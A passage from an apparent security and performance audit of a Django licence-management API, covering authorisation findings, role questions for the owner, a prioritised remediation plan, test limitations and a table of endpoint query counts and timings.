  - B01: a no-group user gets 200 on `/api/tasks/assignable-users/` (id, username, names of all active users) and on `/api/schema/`.
- **Root cause:**
  - `apps/accounts/serializers.py:39-52`: `username` and `is_active` are writable on `/me`.
  - `apps/tasks/views.py:130-139`.
  - `lmanagement/urls.py:21`: the schema is gated only by `IsAuthenticated` when DEBUG is False.
- **Remediation:** Make `username` and `is_active` read-only on `/me`.
- **Business approval:** Partly. Restricting the user list needs an owner decision.

## Owner questions (business semantics, not defects)

1. **Q1:** Should TRADE_VIEWER and TRADE_MANAGER be able to list, retrieve and export all licences through the API? The backend `LicensePermission` read set includes them, but the frontend `LICENSE_ROLES` (LM, LV) hides the licence pages from them.
2. **Q2:** Which roles may upload or attach supplier purchase-invoice evidence for ledger packages (D01/D02)? Today it is every ledger read role, including TRADE_VIEWER.
3. **Q3:** Segregation of duties. A USER_MANAGER can grant itself or others USER_MANAGER and ACCOUNTS_APPROVER (B02 `self_grant` 200). Should grants of USER_MANAGER and ACCOUNTS_* be superuser-only?
4. **Q4:** Accounting has no per-user entity (EntityBooks) scoping. Any ACCOUNTS_* user sees and acts on every entity. Is that intended?
5. **Q5:** Maker-checker. May an ACCOUNTS_APPROVER post or reverse a voucher or invoice they drafted themselves? There is currently no check.
6. **Q6:** Master data (unit prices, exchange rates, transfer-letter templates, SION and HS masters) is readable by any authenticated user, including users with no groups. Is that intended?
7. **Q7:** Transfer-letter generation is allowed to ALLOTMENT_VIEWER and TRADE_VIEWER (`TransferLetterPermission`). Please confirm; only the BOE_VIEWER exclusion is documented.

## Prioritised remediation

1. D02 (storage-key validation) and D01 (role gate on ledger-package write actions; needs the owner's Q2 answer).
2. D03: allow-list licence documents, force `attachment` for non-PDF/image media, add CSP.
3. D14: owner checks and rotates the tracked DGFT environment file, then untracks it.
4. D07: revoke tokens on password change or reset; deny-list the access token on logout.
5. D08: throttle or IP-restrict `/admin/`.
6. D04: deny-by-default media prefix mapping.
7. D05 and D06: one export-cell sanitiser; escape PDF markup.
8. D15, D12, D13, D10, D09, D11, D16.

## Limitations

- **Matrix scope:** The matrix tests the class-level DRF gate only. Object-level and handler-level checks were verified only through the live probes listed. The 10 routes with fixed-value kwargs were code-reviewed rather than executed.
- **Probe data:** Live probes used minimal fixture data. Business-rule correctness of the responses was not assessed.
- **Not reached in the matrix:** Celery task bodies and worker-side rendering. Redis and the network were blocked, and `on_commit` callbacks do not fire inside test transactions.
- **Not tested:**
  - production nginx/gunicorn behaviour (XFF, X-Accel, headers): reviewed from the tracked configs only
  - email delivery
  - MDS write cutover (`MDS_ENABLED=False` in tests)
  - the sync peer API beyond the user-JWT rejection
- **Partial review:** Only the allotment module of the 15 reportlab modules was probed for markup injection. The SEC-02 company sensitive-field narrowing was code-reviewed only.
- **Dependency audits:** NOT-RUN (no offline tool available; installs and network are forbidden).
- **Environment-file contents:** not inspected. D14 is rated on presence only.
- **Test database:** `test_lmanagement_sat_sec` was created with `--create-db` and left in place for `--reuse-db` reruns. It is a throwaway local test DB.

# Performance (controller appends)

Controller summary of Phase 8. Measured by `sat-api-perf` on `lmanagement` (read-only, rolled-back atomic, one
machine, one process, LocMem cache, DRF throttling disabled in the harness only). Source:
`SAT_API_DATABASE_AUDIT.md` §3, evidence `~/lm_sat_evidence/api/p8_perf.log` (exit 0) and `p8_perf.json`.

| ID | Endpoint | Wall s (run 1 / run 2) | Queries | Peak mem | Response | Verdict |
|---|---|---|---|---|---|---|
| SAT-PERF-001 | licence list (page sizes 10 / 25 / 100) | 0.12–0.28 warm | 16 at every page size | ≤ 6.6 MB warm | 21–916 KB | PASS: no N+1 |
| SAT-PERF-002 | licence detail (id 1775, 56 items / id 1) | 0.85 / 0.39–0.45 | **290 / 143** | 5.2 / 1.1 MB | 107 / 34 KB | PASS-EXC: grows with item count (SAT-DEF-033) |
| SAT-PERF-003 | balance-ledger / overview-summary (1775) | 0.31–0.37 / 0.19–0.20 | 85 / 47 | 1.4 / 0.4 MB | — | PASS |
| SAT-PERF-004 | BOE list (page size 10 / 100 → 73 rows) | 1.3–1.4 / **9.5–11.0** | **431 / 3,578** | 1.7 / 8.3 MB | 27 / 161 KB | FAIL: N+1, ~43–49 queries per row (SAT-DEF-030) |
| SAT-PERF-005 | allotment list (page size 10 / 100) | 0.35 / 0.80 | 30 / 179 | 6.0 / 12.1 MB | 36 / 268 KB | PASS-EXC: ~1.7 queries per row (SAT-DEF-039) |
| SAT-PERF-006 | item-pivot (E5) | 3.7–3.8 | 109 | 45 MB | 11.2 MB | PASS (heavy) |
| SAT-PERF-007 | item-report (all) | 4.4–4.7 | 17 | **229.8 MB** | **65.3 MB** | FAIL: unpaginated (SAT-DEF-034) |
| SAT-PERF-008 | dashboard | 0.08–0.10 | 19 | 0.3 MB | 2.4 KB | PASS |
| SAT-PERF-009 | planned-report | 0.81–0.84 | 12 | 37.0 MB | 10.5 MB | PASS (unpaginated payload) |
| SAT-PERF-010 | masters companies (page size 10 / 100) | 0.01–0.04 | 2 / 2 | ≤ 0.5 MB | 7 / 56 KB | PASS |
| SAT-PERF-011 | license-items (page size 100) | 0.05–0.06 | 3 | 0.8 MB | 18 KB | PASS |
| SAT-PERF-012 | license-ledger list / inventory-balance / trades (0 rows) | ≤ 0.02 | 1–4 | < 0.5 MB | < 4 KB | PASS (trivial: empty tables) |

Export timings from Phase 6: the default allotment xlsx export takes ~33 s (SAT-DEF-022). Not measurable: trade,
payment, voucher and accounting lists, because those tables have 0 rows locally. No concurrent-load or soak test was run.
These figures are the **baseline** for future regression runs. Suggested thresholds (derived from this baseline, not business-approved): licence list ≤ 20 queries and flat across page sizes; BOE list ≤ 20 flat; licence detail ≤ 150; item-pivot E5 < 5 s; item-report < 6 s.
